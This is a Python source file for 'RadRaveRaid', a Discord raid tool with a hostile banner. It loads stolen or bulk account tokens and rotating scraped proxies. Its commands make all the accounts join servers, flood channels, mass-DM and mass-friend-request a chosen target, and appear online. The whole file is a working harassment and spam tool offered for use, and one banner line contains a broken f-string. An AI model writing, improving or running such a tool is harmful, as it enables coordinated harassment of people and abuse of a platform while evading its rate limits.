# coding=utf8
class INIT:
    __version__ = 1.8

import json,requests,os,time,random,ctypes,selenium,websocket,sys
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore
req = requests.Session()

with open("config.json", encoding='utf-8', errors='ignore') as f:
    configdata = json.load(f, strict=False)
config = configdata["BotConfig"]

tokens = open('tokens.txt','r').read().splitlines()
proxies = open('proxies.txt','r').read().splitlines()
proxies = [{'https':'http://'+proxy} for proxy in proxies]

executor = ThreadPoolExecutor(max_workers=config["threadcap"])

def Setup():
    ctypes.windll.kernel32.SetConsoleTitleW(f'[RadRaveRaid v{INIT.__version__}] | By Fawful')
    counttokens = len(open('tokens.txt').readlines())
    countproxies = len(open('proxies.txt').readlines())

    print(f'''{Fore.RESET}                {Fore.MAGENTA}    ____            __{Fore.RESET}{Fore.CYAN}   ____                 {Fore.RESET}{Fore.RED}     ____        _     __{Fore.
                                                                                                                                                                             
_________                       __    __________                        __________        .__    .___            
\_   ___ \  ____  __ __________/  |_  \______   \ ____   ____   _____   \______   \_____  |__| __| _/___________ 
/    \  \/ /  _ \|  |  \_  __ \   __\  |       _//  _ \ /  _ \ /     \   |       _/\__  \ |  |/ __ |/ __ \_  __ \
\     \___(  <_> )  |  /|  | \/|  |    |    |   (  <_> |  <_> )  Y Y  \  |    |   \ / __ \|  / /_/ \  ___/|  | \/
 \______  /\____/|____/ |__|   |__|    |____|_  /\____/ \____/|__|_|  /  |____|_  /(____  /__\____ |\___  >__|   
        \/                                    \/                    \/          \/      \/        \/    \/       
                       {Fore.CYAN}RadRaveRaid {INIT.__version__} {Fore.RESET}| Because fuck you
                       {Fore.CYAN}Type {Fore.RESET}"help"{Fore.CYAN} for a list of commands
                       {Fore.GREEN}{counttokens}{Fore.RESET}{Fore.CYAN} tokens loaded!
                       {Fore.GREEN}{countproxies}{Fore.RESET}{Fore.CYAN} proxies loaded!
                       {Fore.MAGENTA}Created by {Fore.RESET}Fawful | {Fore.CYAN}Special thx to {Fore.RESET}Humble#8292{Fore.CYAN}, {Fore.RED}RaidToolBox{Fore.CYAN}, and {Fore.YELLOW}h0nda
                       {Fore.MAGENTA}https://github.com/{Fore.RESET}riaaaaaaaa
''' + Fore.RESET)

def Help():
    print(f'''{Fore.RESET}{Fore.RED}                       -- Commands are seperated by commas --{Fore.RESET}
        
{Fore.CYAN}join >> (invite) | {Fore.RESET}Joins all your tokens to the server using the specified invite.
{Fore.CYAN}leave >> (serverid) | {Fore.RESET}Joins all your tokens to the server using the specified invite.
{Fore.CYAN}bringonline | {Fore.RESET}Brings all of your tokens online {Fore.RED}*
{Fore.CYAN}spam  >> (channelid) (amount) (message) | {Fore.RESET}Spams the given channel any amount of times. Tokens must already be in server.
{Fore.CYAN}friend  >> (username#discrimanator) | {Fore.RESET}Makes all your tokens send a friend request to your target. {Fore.RED}*
{Fore.CYAN}dm >> (userid) (amount) (message) | {Fore.RESET}Makes all your tokens DM the given ID. {Fore.RED}*
{Fore.CYAN}check-tokens | {Fore.RESET}Checks all of your tokens to see if they are valid.
{Fore.CYAN}scrape-proxies | {Fore.RESET}Scrapes HTTP proxies from proxyscrape.com and writes them to proxies.txt.
{Fore.CYAN}reset | {Fore.RESET}Resets the console.

{Fore.RED}* LIKELY TO LOCK UNVERIFIED TOKENS, USE WITH CAUTION
''' + Fore.RESET)
    Start()

def Scrape():
    print(f"[{Fore.GREEN}+{Fore.RESET}] Scraping proxies...")
    try:
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
        file = open("proxies.txt", "a+")
        file.seek(0)
        file.truncate()
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
        file.close()
        print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
    Start()

def Join(invite):
    try:
        print(f"[{Fore.GREEN}+{Fore.RESET}] Joining...")
        inv = invite.replace("https://discord.gg/","")
        if config["useproxy"] == True:
            for tok in tokens:
                proxy = random.choice(proxies)
                r = req.post(f'https://discord.com/api/v8/invites/{inv}', headers = {'Authorization': tok}, proxies = proxy)
        else:
            for tok in tokens:
                r = req.post(f'https://discord.com/api/v8/invites/{inv}', headers = {'Authorization': tok})
        print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
    Start()

def Leave(serverid):
    try:
        print(f"[{Fore.GREEN}+{Fore.RESET}] Leaving...")
        if config["useproxy"] == True:
            for tok in tokens:
                proxy = random.choice(proxies)
                r = req.delete(f'https://discord.com/api/v8/users/@me/guilds/{serverid}', headers = {'Authorization': tok}, proxies = proxy)
        else:
            for tok in tokens:
                r = req.delete(f'https://discord.com/api/v8/users/@me/guilds/{serverid}', headers = {'Authorization': tok})
        print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
    Start()

def Friend(target):
    try:
        print(f"[{Fore.GREEN}+{Fore.RESET}] Friending...")
        tartag = target.split('#')
        name = tartag[0]
        discrim = tartag[1]
        if config["useproxy"] == True:
            for tok in tokens:
                proxy = random.choice(proxies)
                r = req.post(f'https://discordapp.com/api/v8/users/@me/relationships', headers = {'Authorization': tok}, json = {'username':name,'discriminator':discrim}, proxies = proxy)
        else:
            for tok in tokens:
                proxy = random.choice(proxies)
                r = req.post(f'https://discordapp.com/api/v8/users/@me/relationships', headers = {'Authorization': tok}, json = {'username':name,'discriminator':discrim})
        print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
    Start()

def DM(tid,amount,message):
    try:
        print(f"[{Fore.GREEN}+{Fore.RESET}] Spamming...")
        if config["useproxy"] == True:
            for _ in range(int(amount)):
                for tok in tokens:
                    proxy = random.choice(proxies)
                    r = req.post(f'https://discordapp.com/api/v8/users/@me/channels', headers = {'Authorization': tok}, json = {'recipient_id':tid}, proxies = proxy).json()
                    r2 = req.post(f"https://discordapp.com/api/v8/channels/{r['id']}/messages", headers = {'Authorization': tok}, json = {'content': message,'nonce':'','tts':False}, proxies = proxy)
        else:
            for _ in range(int(amount)):
                for tok in tokens:
                    r = req.post(f'https://discordapp.com/api/v8/users/@me/channels', headers = {'Authorization': tok}, json = {'recipient_id':tid}).json()
                    r2 = req.post(f"https://discordapp.com/api/v8/channels/{r['id']}/messages", headers = {'Authorization': tok}, json = {'content': message,'nonce':'','tts':False})
        print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
    Start()

def Spam(channel,amount,message):
    try:
        print(f"[{Fore.GREEN}+{Fore.RESET}] Spamming...")
        if config["useproxy"] == True:
            for _ in range(int(amount)):
                for tok in tokens:
                    proxy = random.choice(proxies)
                    r = req.post(f'https://discordapp.com/api/v8/channels/{channel}/messages', headers = {'Authorization': tok}, json = {'content': message,'nonce':'','tts':False}, proxies = proxy)
        else:
            for _ in range(int(amount)):
                for tok in tokens:
                    r = req.post(f'https://discordapp.com/api/v8/channels/{channel}/messages', headers = {'Authorization': tok}, json = {'content': message,'nonce':'','tts':False})
        print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
    Start()

def Check():
    print(f"[{Fore.GREEN}+{Fore.RESET}] Checking...")
    try:
        file = open("tokens.txt", "w")
        file.seek(0)
        file.truncate()
        working = []
        if config["useproxy"] == True:
            for tok in tokens:
                proxy = random.choice(proxies)
                r = req.get(f'https://discord.com/api/v8/users/@me', headers = {'authorization':tok}, proxies = proxy)
                if r.status_code == 200:
                    working.append(tok)
            for t in working:
                file.write((t)+"\n")
        else:
            for tok in tokens:
                r = req.get(f'https://discord.com/api/v8/users/@me', headers = {'authorization':tok})
                if r.status_code == 200:
                    working.append(tok)
            for t in working:
                file.write((t)+"\n")
        file.close()
        print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
    Start()

def StausChange(tok):
    ws = websocket.WebSocket()
    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
    hello = json.loads(ws.recv())
    heartbeat_interval = hello['d']['heartbeat_interval']
    auth = {
        "op": 2,
        "d": {
            "token": tok,
            "properties": {
                "$os": sys.platform,
                "$browser": "RTB",
                "$device": f"{sys.platform} Device"
            },
            "presence": {
                "status": "online",
                "since": 0,
                "afk": False
            }
        },
        "s": None,
        "t": None
    }
    ws.send(json.dumps(auth))
    ack = {
        "op": 1,
        "d": None
    }
    while True:
        time.sleep(heartbeat_interval/1000)
        try:
            ws.send(json.dumps(ack))
        except Exception:
            break

def BringOnline():
    try:
        print(f"[{Fore.GREEN}+{Fore.RESET}] Bringing online...")
        for tok in tokens:
            executor.submit(StausChange,tok)
        print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
    Start()

def Clear():
    os.system('cls')

def Start():
    command = list(input('').split(','))
    if command[0] == 'help':
        Help()
    elif command[0] == 'scrape-proxies':
        Scrape()
    elif command[0] == 'check-tokens':
        Check()
    elif command[0] == 'spam':
        channel = command[1]
        amount = command[2]
        message = command[3]
        Spam(channel,amount,message)
    elif command[0] == 'dm':
        target = command[1]
        amount = command[2]
        message = command[3]
        DM(target,amount,message)
    elif command[0] == 'friend':
        target = command[1]
        Friend(target)
    elif command[0] == 'reset':
        Clear()
        Setup()
        Start()
    elif command[0] == 'join':
        invite = command[1]
        Join(invite)
    elif command[0] == 'bringonline':
        BringOnline()
    elif command[0] == 'leave':
        serverid = command[1]
        Leave(serverid)
    else:
        print(f'{Fore.YELLOW}Invalid Command, type "help" for a list of valid commands.'+Fore.RESET)
        Start()

if __name__ == '__main__':
    try:
        Clear()
        Setup()
        Start()
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
